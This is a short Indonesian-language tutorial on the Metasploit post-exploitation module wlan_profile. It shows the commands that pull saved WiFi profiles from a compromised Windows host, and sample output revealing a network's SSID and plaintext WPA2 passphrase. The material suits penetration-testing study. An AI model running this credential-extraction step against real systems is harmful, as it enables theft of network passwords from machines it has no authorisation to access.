# wlan_profile 

Module `wlan_profile` di Metasploit adalah modul `post-exploitation` untuk sistem Windows yang digunakan untuk mengambil informasi profil jaringan WiFi yang tersimpan di komputer target, termasuk `SSID`, `jenis autentikasi`, dan `password` jika tersedia. Modul ini bekerja setelah akses ke sistem berhasil diperoleh (misalnya via meterpreter) dan memanfaatkan perintah internal Windows seperti netsh wlan show profile untuk mengekstrak data jaringan secara otomatis.

## Cara Penggunaan di Metasploit

```
use post/windows/wlan/wlan_profile
set SESSION <ID>
set VERBOSE true
run
```

Hasil output-nya seperti ini:

```
[+] Wireless LAN Profile Information 
GUID: {28b9c93f-a298-45f8-b88c-8f898895ee2b} Description: Realtek 8814AU Wireless LAN 802.11ac USB NIC State: The interface is not connected to any network.
 Profile Name: COMPASS CIKARANG
<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
	<name>COMPASS CIKARANG</name>
	<SSIDConfig>
		<SSID>
			<hex>434F4D504153532043494B4152414E47</hex>
			<name>COMPASS CIKARANG</name>
		</SSID>
	</SSIDConfig>
	<connectionType>ESS</connectionType>
	<connectionMode>auto</connectionMode>
	<MSM>
		<security>
			<authEncryption>
				<authentication>WPA2PSK</authentication>
				<encryption>AES</encryption>
				<useOneX>false</useOneX>
			</authEncryption>
			<sharedKey>
				<keyType>passPhrase</keyType>
				<protected>false</protected>
				<keyMaterial>qwerty12345</keyMaterial>
			</sharedKey>
		</security>
	</MSM>
	<MacRandomization xmlns="http://www.microsoft.com/networking/WLAN/profile/v3">
		<enableRandomization>false</enableRandomization>
	</MacRandomization>
</WLANProfile>

[*] WlanAPI Handle Closed Successfully
[*] Post module execution completed
```
